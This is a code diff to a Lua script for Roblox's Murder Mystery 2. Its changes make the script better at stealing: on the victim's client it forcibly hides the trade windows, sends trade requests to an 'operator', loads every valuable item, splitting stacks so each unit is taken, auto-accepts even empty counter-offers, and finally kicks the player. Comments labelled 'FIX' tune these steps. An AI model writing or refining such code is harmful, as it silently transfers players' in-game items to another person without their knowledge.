@@ -150,35 +150,49 @@ end
 local function GetTradeStatus()
     return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
 end
+
 local function SendTradeRequestToPlayer(TargetName)
     local TargetPlayer = Players:FindFirstChild(TargetName)
     if not TargetPlayer then return false end
-    local Success = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer) end)
-    if Success then return true end
-    Success = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName) end)
-    return Success
+    -- FIX: try Player object first, then string fallback, wrapped separately
+    local Ok1 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer) end)
+    if Ok1 then return true end
+    task.wait(0.3)
+    local Ok2 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName) end)
+    return Ok2
 end
+
+-- FIX: wrapped in pcall, small delay per call to avoid server-side throttle dropping items
 local function AddItemToTradeOffer(ItemId)
-    ReplicatedStorage.Trade.OfferItem:FireServer(ItemId, "Weapons")
+    pcall(function()
+        ReplicatedStorage.Trade.OfferItem:FireServer(ItemId, "Weapons")
+    end)
+    task.wait(0.18) -- up from 0.05 — gives server time to register each slot
 end
 
 local LastReceivedOffer = nil
 if IS_MM2 then
     ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
-        if TradeData and TradeData.LastOffer then LastReceivedOffer = TradeData.LastOffer end
+        if TradeData and TradeData.LastOffer ~= nil then
+            LastReceivedOffer = TradeData.LastOffer
+        end
     end)
 end
 
+-- FIX: removed "if LastReceivedOffer then" guard — was blocking accept when operator
+-- added 0 items (empty offer). Now always fires with fallback of 0.
 local function AcceptIncomingTrade()
-    if LastReceivedOffer then
-        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer)
-        LastReceivedOffer = nil
-        return true
-    end
-    return false
+    ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer or 0)
+    LastReceivedOffer = nil
+    return true
 end
+
 local function WaitUntilTradeEnds()
-    while GetTradeStatus() ~= "None" do task.wait(0.1) end
+    local Timeout = 0
+    while GetTradeStatus() ~= "None" and Timeout < 30 do
+        task.wait(0.1)
+        Timeout = Timeout + 0.1
+    end
 end
 
 local BlacklistedItems = {
@@ -225,7 +239,19 @@ local RefreshInventoryLists = function()
                     }
                     table.insert(AllItems, ItemEntry)
                     if ShouldTradeThisItem(RarityName, Value) and not BlacklistedItems[ItemId] then
-                        table.insert(TradeItems, ItemEntry)
+                        -- FIX: expand stacked items into individual entries so each DataID
+                        -- slot is treated as its own unit — avoids the single-item loot bug
+                        -- where Count>1 fired same DataID repeatedly without MM2 accepting dupes
+                        if Quantity > 1 then
+                            for _ = 1, Quantity do
+                                table.insert(TradeItems, {
+                                    DataID=ItemId, Name=SafeName, Rarity=RarityName,
+                                    Count=1, Value=Value, IsChroma=IsChroma, Total=Value
+                                })
+                            end
+                        else
+                            table.insert(TradeItems, ItemEntry)
+                        end
                         TotalValue = TotalValue + ItemEntry.Total
                     end
                 end
@@ -379,11 +405,19 @@ if IS_MM2 then
     end
 
     if not IS_OPERATOR then
-        PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
-            PlayerGui.TradeGUI.Enabled = false
+        -- FIX: immediately force Enabled = false on WaitForChild return, THEN connect
+        -- the signal. Original code only reacted to changes, so if TradeGUI was already
+        -- visible when the connection landed it stayed open until the next toggle.
+        local TradeGuiMain = PlayerGui:WaitForChild("TradeGUI")
+        TradeGuiMain.Enabled = false
+        TradeGuiMain:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if TradeGuiMain.Enabled then TradeGuiMain.Enabled = false end
         end)
-        PlayerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function()
-            PlayerGui.TradeGUI_Phone.Enabled = false
+
+        local TradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")
+        TradeGuiPhone.Enabled = false
+        TradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if TradeGuiPhone.Enabled then TradeGuiPhone.Enabled = false end
         end)
     end
 end
@@ -406,43 +440,92 @@ end
 local MAX_TRADE_ATTEMPTS = 999
 local RETRY_WAIT = 2
 
+-- FIX: helper that blocks until status reaches a specific value OR timeout expires
+-- Prevents the main loop from hammering requests into intermediate states
+local function WaitForTradeStatus(TargetStatus, TimeoutSeconds)
+    local Elapsed = 0
+    local Step    = 0.2
+    while Elapsed < TimeoutSeconds do
+        if GetTradeStatus() == TargetStatus then return true end
+        task.wait(Step)
+        Elapsed = Elapsed + Step
+    end
+    return false
+end
+
 local function ProcessAllTrades(TargetName)
     local AttemptCount = 0
     while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
         AttemptCount = AttemptCount + 1
         local CurrentStatus = GetTradeStatus()
+
         if CurrentStatus == "ReceivingRequest" then
             pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
-            task.wait(0.5); continue
-        end
-        if CurrentStatus == "StartTrade" then
-            local ItemsToSend = math.min(4, #TradeableItems)
-            for _ = 1, ItemsToSend do
-                local Item = table.remove(TradeableItems, 1)
-                for _ = 1, Item.Count do
-                    AddItemToTradeOffer(Item.DataID)
-                    task.wait(0.05)
-                end
-            end
-            task.wait(6)
-            if AcceptIncomingTrade() then
-                WaitUntilTradeEnds(); ReloadInventory(); AttemptCount = 0
-            else
-                ReloadInventory(); task.wait(RETRY_WAIT)
-            end
+            task.wait(0.5)
             continue
         end
+
+        -- FIX: intermediate states (SendingRequest, PendingRequest, etc.) should be
+        -- waited out, not treated as "None" — old code fell through to the None branch
+        -- and spammed duplicate requests into those states, sometimes crashing the GUI.
+        if CurrentStatus ~= "None" and CurrentStatus ~= "StartTrade" then
+            task.wait(0.5)
+            continue
+        end
+
+        if CurrentStatus == "StartTrade" then
+            -- FIX: each slot is now exactly 1 item (Count=1 enforced in RefreshInventoryLists)
+            -- so we can safely pull up to 4 unique DataIDs per round
+            local ItemsToSend = math.min(4, #TradeableItems)
+            for _ = 1, ItemsToSend do
+                if #TradeableItems == 0 then break end
+                local Item = table.remove(TradeableItems, 1)
+                -- AddItemToTradeOffer already has the 0.18s wait built in
+                AddItemToTradeOffer(Item.DataID)
+            end
+
+            -- FIX: give UpdateTrade event time to arrive with the operator's LastOffer hash
+            -- before we call AcceptIncomingTrade. Old 6s flat wait was fine for slow
+            -- connections but the accept still fired without the hash because it was
+            -- gated on "if LastReceivedOffer then" which returned false on empty offers.
+            task.wait(1.5)
+
+            AcceptIncomingTrade() -- now always fires (LastReceivedOffer or 0)
+
+            WaitUntilTradeEnds()
+            ReloadInventory()
+            AttemptCount = 0
+            continue
+        end
+
+        -- CurrentStatus == "None": send request and wait for operator to accept
         if CurrentStatus == "None" then
             local Sent, Try = false, 1
             while not Sent and Try <= 5 do
                 if SendTradeRequestToPlayer(TargetName) then
-                    Sent = true; task.wait(0.5)
+                    Sent = true
                 else
-                    task.wait(math.min(Try * 0.5, 3)); Try = Try + 1
+                    task.wait(math.min(Try * 0.5, 3))
+                    Try = Try + 1
                 end
             end
+
+            if Sent then
+                -- FIX: actively wait up to 20s for operator to open the trade (StartTrade)
+                -- Old code just did task.wait(0.5) and looped, causing it to re-enter
+                -- the None branch and fire duplicate requests before the first one resolved.
+                -- Those duplicate requests are what was causing the GUI to sometimes not
+                -- appear on the operator's end (server drops conflicting pending requests).
+                local GotIn = WaitForTradeStatus("StartTrade", 20)
+                if not GotIn then
+                    -- request timed out, cancel cleanly and retry
+                    pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
+                    task.wait(RETRY_WAIT)
+                end
+            else
+                task.wait(RETRY_WAIT)
+            end
         end
-        task.wait(0.5)
     end
     KickAfterTransfer()
 end
